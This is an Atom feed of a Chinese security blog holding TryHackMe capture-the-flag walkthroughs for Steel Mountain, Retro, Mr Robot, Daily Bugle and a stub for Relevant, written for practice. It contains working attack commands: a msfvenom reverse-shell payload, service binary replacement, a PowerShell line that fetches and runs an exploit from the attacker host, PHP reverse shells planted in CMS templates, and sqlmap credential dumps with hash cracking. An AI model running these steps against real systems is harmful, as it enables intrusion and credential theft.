<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ya1orin🍭</title>
  
  
  <link href="https://www.fomal.cc/atom.xml" rel="self"/>
  
  <link href="https://www.fomal.cc/"/>
  <updated>2024-10-14T12:21:35.216Z</updated>
  <id>https://www.fomal.cc/</id>
  
  <author>
    <name>Ya1orin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>THM-Steel Mountain</title>
    <link href="https://www.fomal.cc/posts/e8bded00.html"/>
    <id>https://www.fomal.cc/posts/e8bded00.html</id>
    <published>2024-10-14T08:27:58.000Z</published>
    <updated>2024-10-14T12:21:35.216Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.51.252</p><p>攻击机ip：10.14.90.122</p></blockquote><h1>写在前面</h1><p><strong>注意：机器不响应ping命令</strong></p><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p><code>nmap --min-rate 10000 -Pn -sV -p- 10.10.51.252</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014163927698-310950412.png" alt="image-20241014163917459"></p><p>开放若干端口，但是可以看出这是一台windows主机</p><h2 id="80端口">80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014164050700-679057908.png" alt="image-20241014164041162"></p><p>一个普通的页面，扫下目录</p><p><code>gobuster dir -u http://10.10.51.252/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014170550004-1267980203.png" alt="image-20241014170540647"></p><p>没什么有用信息</p><p>查看下源码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014191706066-655513886.png" alt="image-20241014191656687"></p><p>找到人名<code>BillHarper</code></p><h2 id="SMB">SMB</h2><p><code>smbclient -L //10.10.51.252</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014191226841-505937933.png" alt="image-20241014191217373"></p><p>不允许匿名登录</p><h2 id="8080端口">8080端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014191537845-1876392148.png" alt="image-20241014191528445"></p><p>发现是一个文件服务器版本号是<code>2.3</code>，点进去看看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014192448714-1892990057.png" alt="image-20241014192438848"></p><p>到这里就知道这个服务器的名字了<code>Rejetto HTTP File Server</code></p><p>可以尝试去网上找找是否有历史漏洞</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014193542336-1095577421.png" alt="image-20241014193532643"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014193635486-838603181.png" alt="image-20241014193625312"></p><p>找到个<code>CVE-2014-6287</code></p><h1>获取初始访问权限</h1><p>启动msf</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014193829983-1899085758.png" alt="image-20241014193820488"></p><p>直接搜索这个cve并使用</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014194006026-989143443.png" alt="image-20241014193956689"></p><p>把必要的参数设置一下</p><p>直接run！</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014195051743-599602628.png" alt="image-20241014195042124"></p><p>获得基础用户权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014195133488-1609533962.png" alt="image-20241014195123919"></p><p>在<code>C:\Users\bill\Desktop</code>找到<code>user.txt</code></p><h1>提升至root权限</h1><p>这台机器上有了一个初始 shell，我们可以进一步枚举操作系统信息并查看将权限升级到root的利用点，使用<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">PowerUp</a>的<code>PowerShell</code>脚本来查看这台 Windows 机器并确定目标机是否存在任何异常和错误配置</p><p>将文件保存到本地，通过msf传上去</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014200155434-17085404.png" alt="image-20241014200146045"></p><p>可以通过<code>meterpreter</code>会话来加载<code>PowerShell</code>扩展，并进入 <code>PowerShell</code>的shell界面并执行脚本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load powershell</span><br><span class="line">powershell_shell</span><br><span class="line"><span class="built_in">Import-Module</span> .\PowerUp.ps1</span><br><span class="line"><span class="built_in">Invoke-AllChecks</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014200617323-413379229.png" alt="image-20241014200607720"></p><p>发现有个特别的服务<code>CanRestart</code>选项被设置为<code>true</code>，当这个选项为<code>true</code>时，我们就能够在系统上重新启动此服务；而且这个应用程序的目录也是可写的，这意味着我们可以用一个恶意应用程序替换合法的应用程序，一旦服务重新启动，我们的恶意程序将运行</p><blockquote><p>ServiceName ：AdvancedSystemCareService9</p><p>ModifiablePath：C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe</p></blockquote><p><code>msfvenom</code>可用于生成反向shell的payload并将其输出为<code>windows</code>可执行文件，我们用<code>msfvenom</code>来生成一个和之前的应用程序同名的恶意应用程序:</p><p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.14.90.122 LPORT=4444 -e x86/shikata_ga_nai -f exe -o ASCService.exe</code></p><p>在 <code>meterpreter</code> 中上传文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014201549634-483647248.png" alt="image-20241014201539989"></p><p>进入shell，先将这个服务停掉，替换我们的文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">sc</span> stop AdvancedSystemCareService9</span><br><span class="line"><span class="built_in">copy</span> ASCService.exe <span class="string">&quot;C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014201806112-808045312.png" alt="image-20241014201756699"></p><p>关于SC命令（Windows shell不区分大小写）：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SC</span>命令的格式：<span class="built_in">SC</span> [<span class="type">Servername</span>] command Servicename [<span class="type">Optionname</span>= <span class="type">Optionvalues</span>]</span><br><span class="line"></span><br><span class="line">Servername：指定服务所在的远程服务器的名称。名称必须采用通用命名约定 (UNC) 格式（“\\myserver”）。如果是在本地运行SC.exe，请忽略此参数。</span><br><span class="line">command ：如query,<span class="built_in">start</span>,stop,create,config等</span><br><span class="line"></span><br><span class="line">Servicename：服务名，也就是要配置的那个服务的名字，例如你要启动一个服务你就输入<span class="built_in">sc</span> <span class="built_in">start</span> +你要启动的服务名称（并非是服务显示名称）。</span><br><span class="line">Optionname= Optionvalues：是选项名和选项的值。</span><br></pre></td></tr></table></figure><p>在重启服务之前，在我们的机器上先启动个监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014201838886-990526090.png" alt="image-20241014201829234"></p><p>然后在靶机中重启服务</p><p><code>sc start AdvancedSystemCareService9</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014201912815-1720693336.png" alt="image-20241014201903513"></p><p>这时就提升到了root权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014202038317-726923127.png" alt="image-20241014202028946"></p><p>在<code>C:\Users\Administrator\Desktop</code>找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Steel Mountain</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
  </entry>
  
  <entry>
    <title>THM-Relevant</title>
    <link href="https://www.fomal.cc/posts/7be7bbec.html"/>
    <id>https://www.fomal.cc/posts/7be7bbec.html</id>
    <published>2024-10-12T11:36:34.000Z</published>
    <updated>2024-10-12T12:47:32.003Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.233.228</p><p>攻击机ip：10.14.90.122</p></blockquote><h1>信息收集</h1>]]></content>
    
    
    <summary type="html">TryHackMe系列之Relevant</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
  </entry>
  
  <entry>
    <title>THM-Retro</title>
    <link href="https://www.fomal.cc/posts/70f6e376.html"/>
    <id>https://www.fomal.cc/posts/70f6e376.html</id>
    <published>2024-10-12T03:46:11.000Z</published>
    <updated>2024-10-12T07:58:16.019Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.52.12</p><p>攻击机ip：10.14.90.122</p></blockquote><h1>写在前面</h1><p><strong>注意：机器不响应ping命令</strong></p><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p><code>nmap --min-rate 10000 -Pn -sV -p- 10.10.52.12</code></p><p>这里使用<code>-Pn</code>参数绕过ping命令的检查</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012124425580-746515289.png" alt="image-20241012124417135"></p><p>发现只开放了80和3389端口，这意味着当我们拿到一组凭据后，可以通过 rdp登录目标主机</p><h2 id="80端口">80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012125109670-1625718676.png" alt="image-20241012125102563"></p><p>是一个<code>windows server</code>默认的IIS服务</p><p>扫描一下目录</p><p><code>gobuster dir -u http://10.10.52.12/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012141145765-33043048.png" alt="image-20241012141138353"></p><p>访问一下<code>/retro</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012143041958-931600745.png" alt="image-20241012143034753"></p><p>在页面最下面发现文章<code>Ready Player One</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012143406701-1000163975.png" alt="image-20241012143359676"></p><p>根据文章意思猜测这是一组登录凭据<code>Wade : parzival</code></p><h1>RDP登录远程主机</h1><p>拿到一组用户凭据，结合之前的3389端口开放，尝试登录</p><p><code>xfreerdp /u:Wade /p:parzival /cert:ignore /v:10.10.52.12</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012143946216-981286449.png" alt="image-20241012143938820"></p><p>登陆成功</p><p>并在桌面找到user.txt</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012144100422-25041175.png" alt="image-20241012144053438"></p><h1>Windows提权</h1><p>先进行windows主机信息搜集</p><p>桌面上有个浏览器，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012144614643-1652594324.png" alt="image-20241012144607785"></p><p>发现该用户收藏了一个cve的页面，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012144928489-1007257350.png" alt="image-20241012144921303"></p><p>是<code>CVE-2019-1388</code></p><p>我们发现目标机的浏览器中有<code>CVE-2019-1388</code>的历史访问记录–猜测用户可能是想针对CVE-2019-1388漏洞打补丁，也就是说目标机器可能存在<code>CVE-2019-1388</code>漏洞</p><p>经过信息搜索可知<code>CVE-2019-1388</code>是一个UAC提权漏洞，该漏洞的基本信息如下：</p><blockquote><p><strong>UAC</strong>:用户帐户控制(User Account Control)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。</p></blockquote><blockquote><p><strong>CVE-2019-1388</strong>：该漏洞位于Windows的UAC（User Account Control，用户帐户控制）机制中。在默认情况下，Windows会在一个单独的桌面上显示所有的UAC提示 Secure Desktop；这些提示是由名为 consent.exe 的可执行文件产生的，该可执行文件以NT AUTHORITY\SYSTEM权限运行，完整性级别为System。</p><p>因为用户可以与该UI交互，因此对UI来说紧限制是必须的，否则，低权限的用户可能可以通过UI操作的循环路由以SYSTEM权限执行操作，即使隔离状态的看似无害的UI特征都可能会成为引发任意控制的动作链的第一步。</p><p><a href="https://github.com/jas502n/CVE-2019-1388">CVE-2019-1388漏洞利用</a></p></blockquote><h2 id="利用UAC漏洞提权">利用UAC漏洞提权</h2><p>我们需要通过执行<code>hhupd.exe</code>文件来完成对CVE-2019-1388的利用，在目标机用户Wade 桌面上的回收站中我们可以找到<code>hhupd.exe</code>文件——我们手动恢复该文件即可</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012145533318-1767894072.png" alt="image-20241012145525730"></p><p>右键单击hhupd.exe文件并选择以管理员身份运行它，然后先点击&quot;显示更多详细信息&quot;，再继续点击&quot;显示有关发布者证书的信息&quot;</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012145637747-550169434.png" alt="image-20241012145630586"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012145657684-1224412202.png" alt="image-20241012145647626"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012145719391-978453998.png" alt="image-20241012145712577"></p><p><img src="https://img2023.cnblogs.com/blog/2857591/202303/2857591-20230308122357026-1060167176.png" alt="image"></p><blockquote><p>如果在上图界面中无法手动选择使用浏览器以打开链接–则需要我们重新部署一个目标机器并在通过RDP运行目标机上的hhupd.exe文件之前 先打开一个IE浏览器实例</p></blockquote><p>因为目标机器没有连接到互联网，所以我们将在<code>Internet Explorer</code>浏览器中看到以下界面（这并不影响漏洞利用过程），此处其实是以系统级别的权限来打开浏览器，我们继续按<code>Alt</code>键弹出程序菜单栏，然后单击&quot;另存为…&quot;</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150200066-2015236866.png" alt="image-20241012150152799"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150347911-676620041.png" alt="image-20241012150339873"></p><p>在弹出的窗口中输入<code>C:\Windows\System32\*.*</code>点击回车，定位到<code>System32</code>目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150458156-990693367.png" alt="image-20241012150451317"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150545579-666682287.png" alt="image-20241012150538624"></p><p>然后在上面输入<code>cmd.exe</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150626890-48998100.png" alt="image-20241012150620038"></p><p>这里正常来说应该是可以提权成功的，但是我这里不知道是哪个步骤出错了，导致没有提权成功。。。</p><h2 id="利用内核漏洞提权">利用内核漏洞提权</h2><p>通过<code>systeminfo</code>进行信息搜集</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012151549840-1471797610.png" alt="image-20241012151542920"></p><p>发现在这个版本下有 <code>CVE-2017-0213</code>漏洞</p><p><a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213_x64.zip"> CVE-2017-0213漏洞利用</a></p><p>在kali机中下载以上 zip文件并通过<code>unzip</code>命令解压得到exe，然后传输该exe文件到靶机中，最后通过远程桌面直接执行该exe文件即可成功提权</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012152613938-1409594014.png" alt="image-20241012152606663"></p><p>起一个python服务</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012152654989-441442532.png" alt="image-20241012152648189"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在靶机cmd中使用Powershell的Invoke-WebRequest模块</span></span><br><span class="line">Powershell <span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> http://<span class="number">10.14</span>.<span class="number">90.122</span>:<span class="number">81</span>/CVE<span class="literal">-2017-0213_x64</span>.exe <span class="literal">-OutFile</span> exploit.exe</span><br><span class="line"></span><br><span class="line">.\exploit.exe</span><br><span class="line"><span class="comment">#执行漏洞利用exe之后，我们能看到该漏洞利用程序生成了一个新的CMD shell且权限为Administrator——提权成功。</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012154001467-1487303658.png" alt="image-20241012153954000"></p><p>提权成功，拿到<code>system</code>权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012154050259-1805537077.png" alt="image-20241012154043442"></p><p>在<code>c:/Users/Administrator/Desktop</code>找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Retro</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
  </entry>
  
  <entry>
    <title>THM-Mr Robot CTF</title>
    <link href="https://www.fomal.cc/posts/9f5f1768.html"/>
    <id>https://www.fomal.cc/posts/9f5f1768.html</id>
    <published>2024-10-09T12:04:27.000Z</published>
    <updated>2024-10-09T13:47:59.857Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.202.26</p><p>攻击机ip： 10.11.101.220</p></blockquote><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p><code>nmap --min-rate 10000 -sS -sV -sC 10.10.202.26</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009200958952-1307236102.png" alt="image-20241009200954547"></p><p>发现22，80等端口，但是ssh服务关闭了</p><h2 id="80端口">80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009201526558-368574539.png" alt="image-20241009201522229"></p><p>默认页面是一个类似于linux终端的界面，正常的命令执行不了，只能执行页面提供的命令</p><p>每个命令都测试了一下，并没有什么她特别重要的信息，先扫描一下目录</p><p><code>gobuster dir -u http://10.10.202.26/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009203017797-1719379315.png" alt="image-20241009203013287"></p><p>结果很多，但是可以看出来这是一个<code>wordpress</code>的站</p><h1>后台getshell</h1><p>先查看一下哎<code>robots.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009203649868-7394202.png" alt="image-20241009203645784"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009203728050-509535539.png" alt="image-20241009203724196"></p><p>找到第一个<code>key</code></p><p>另一个文件<code>fsocity.dic</code>访问后自动下载了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009204040584-1051975220.png" alt="image-20241009204036224"></p><p>打开后是个字典</p><p>接着访问扫描出来的结果时，发现在<code>/license</code>文件下有信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009204827064-1879933782.png" alt="image-20241009204822920"></p><p>很像<code>base64</code>编码，解码试试</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009205002306-1782867748.png" alt="image-20241009204958248"></p><p>得到一个用户名密码：<code>elliot:ER28-0652</code></p><p>尝试登陆<code>wordpress</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009205219208-88514281.png" alt="image-20241009205215191"></p><p>没想到这是个admn用户，赚翻啦</p><p>直接kali监听一手</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009210509904-1918358012.png" alt="image-20241009210505770"></p><p>将准备好的<a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse-shell.php</a>写在<code>404.php</code>上</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009212111435-983517017.png" alt="image-20241009212106883"></p><p>设置好ip和port后保存</p><p>浏览器访问<code>http://10.10.202.26/theme/twentyfifteen/404.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009212848299-908977679.png" alt="image-20241009212844443"></p><p>拿到初始权限</p><h1>提升至user权限</h1><p>切换交互式shell</p><p><code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009213103248-2017368856.png" alt="image-20241009213059186"></p><p><code>/home</code>下有<code>robot</code>用户，进入之后发现第二个<code>key</code>，但是我们查看不了，我们能查看另一个文件，根据其内容可以判断出这是<code>robot</code>的用户名和密码</p><p>将密码保存到文件<code>hash</code>中，用<code>hashcat</code>离线破解试试</p><p><code>hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009213509026-1986403223.png" alt="image-20241009213504820"></p><p>破解成功，拿到<code>robot</code>用户的明文密码<code>abcdefghijklmnopqrstuvwxyz</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009213616619-415158260.png" alt="image-20241009213612441"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009213650967-1591154118.png" alt="image-20241009213647123"></p><p>拿到第二个<code>key</code></p><h1>提升至root权限</h1><p>先尝试<code>sudo -l</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009214047420-696985946.png" alt="image-20241009214043116"></p><p>ok，不让用</p><p>用<code>find</code>查一下特权命令</p><p><code>find / -perm -u=s -type f 2&gt; /dev/null</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009214115004-1182315555.png" alt="image-20241009214110829"></p><p>发现有<code>nmap</code>，可以利用<code>nmap</code>提权</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009214602683-1592532035.png" alt="image-20241009214558352"></p><p>提权成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009214644568-905281974.png" alt="image-20241009214640433"></p><p>在<code>/root</code>目录下找到最后一个<code>key</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Mr Robot CTF</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
  </entry>
  
  <entry>
    <title>THM-Daily Bugle</title>
    <link href="https://www.fomal.cc/posts/4b5f600a.html"/>
    <id>https://www.fomal.cc/posts/4b5f600a.html</id>
    <published>2024-10-08T05:23:31.000Z</published>
    <updated>2024-10-08T08:38:27.456Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.158.159</p><p>攻击机ip： 10.11.101.220</p></blockquote><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p><code>nmap --min-rate 10000 -p- -sV -sC 10.10.158.159 -oN reports/nmap</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008133602854-1151410066.png" alt="image-20241008133559967"></p><p>发现有22，80，3306端口开放，并且在80端口上有<code>robots.txt</code>，开启了mysql服务</p><h2 id="80端口">80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008135115833-1217847155.png" alt="image-20241008135112969"></p><p>页面貌似没什么信息，扫描一下目录</p><p><code>gobuster dir -u http://10.10.158.159/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008135616416-1722312870.png" alt="image-20241008135614061"></p><p>先看下<code>robots.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008135637011-1331873752.png" alt="image-20241008135634589"></p><p>综上来看这是一个<code>joomla CMS</code>，目录访问后并没有发现什么信息</p><h1>SQL漏洞利用</h1><p>使用<code>joomscan</code>测试一下</p><p><code>joomscan -u http://10.10.158.159/</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008141255235-581479402.png" alt="image-20241008141252485"></p><p>发现版本是3.7.0，搜索一下是否有可以利用的漏洞</p><p><code>searchsploit joomla 3.7.0</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008141440663-205205108.png" alt="image-20241008141438525"></p><p>发现在该版本存在sql注入，将文件复制下来查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008141545963-1681767930.png" alt="image-20241008141543468"></p><p>这里写了使用<code>sqlmap</code>工具进行sql注入，直接照着弄就行</p><p><code>sqlmap -u &quot;http://10.10.158.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008143755357-1634909799.png" alt="image-20241008143752393"></p><p>利用成功，得到数据库，继续爆破表</p><p><code>sqlmap -u &quot;http://10.10.158.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla --tables -p list[fullordering]</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008144208470-98185412.png" alt="image-20241008144206265"></p><p>得到很多表，我们重点看<code>users</code>表，先查看字段的值</p><p><code>sqlmap -u &quot;http://10.10.158.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla -T '#__users' --columns -p list[fullordering]</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008144831007-655266633.png" alt="image-20241008144828658"></p><p>选项直接正常选就行</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008150239571-1068282498.png" alt="image-20241008150237274"></p><p>漫长等待后也是把字段爆破出来了，我们重点看用户名和密码</p><p><code>sqlmap -u &quot;http://10.10.158.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla -T '#__users' -C username,password --dump -p list[fullordering]</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008150415433-886794507.png" alt="image-20241008150413037"></p><p>成功拿到了一组凭据</p><p><code>jonah : $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm</code></p><p>密码是加密数据，这里使用<code>john</code>破解，先将密码保存至<code>hash</code></p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152021738-1397311919.png" alt="image-20241008152018882"></p><p>得到<code>jonah</code>用户的明文密码<code>spiderman123</code></p><p>登录<code>joomla</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152334179-1197770814.png" alt="image-20241008152331521"></p><p>登陆成功</p><h1>获得初始权限</h1><p>查看后发现可以通过改写模板文件的内容getshell</p><p>首先点击右侧<code>Template</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152509620-2024984243.png" alt="image-20241008152507304"></p><p>再点击右侧的<code>Template</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152709570-776349238.png" alt="image-20241008152706921"></p><p>选第一个<code>Beez3</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152751934-1122413670.png" alt="image-20241008152749484"></p><p>为了方便反弹shell，直接修改index.php文件</p><p>将<a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse-shell.php</a>写到文件中，并修改其中的ip和port</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008154536026-2069500358.png" alt="image-20241008154533386"></p><p>保存，在kali中起个监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008153222944-538312390.png" alt="image-20241008153220414"></p><p>在页面中访问刚才修改的文件</p><p><code>http://10.10.158.159/templates/beez3/index.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008154616790-1766426576.png" alt="image-20241008154614259"></p><p>getshell成功！</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008154837476-1061401653.png" alt="image-20241008154835273"></p><p>现在只有一个初始访问权限，还需要横向移动到<code>jjameson</code>用户</p><h1>提升至user权限</h1><p>先查看文件</p><p><img src="C:/Users/lemon/AppData/Roaming/Typora/typora-user-images/image-20241008160838389.png" alt="image-20241008160838389"></p><p>在查看文件的时候发现在 <code>/var/www/html</code>目录下有个<code>configuration.php</code>文件，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161000178-1468348786.png" alt="image-20241008160957808"></p><p>发现有密码<code>nv5uz9r3ZEDzVjNu</code>，貌似是root用户的，ssh登录一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161333840-1625929510.png" alt="image-20241008161331426"></p><p>看样子不是root的密码，尝试ssh登陆<code>jjameson</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161255917-2029099622.png" alt="image-20241008161253699"></p><p>登陆成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161356936-1355687411.png" alt="image-20241008161354772"></p><p>直接在当前页面找到<code>user.txt</code></p><h1>提升至root权限</h1><p>先执行<code>sudo -l</code>看看是否有可利用的</p><p><img 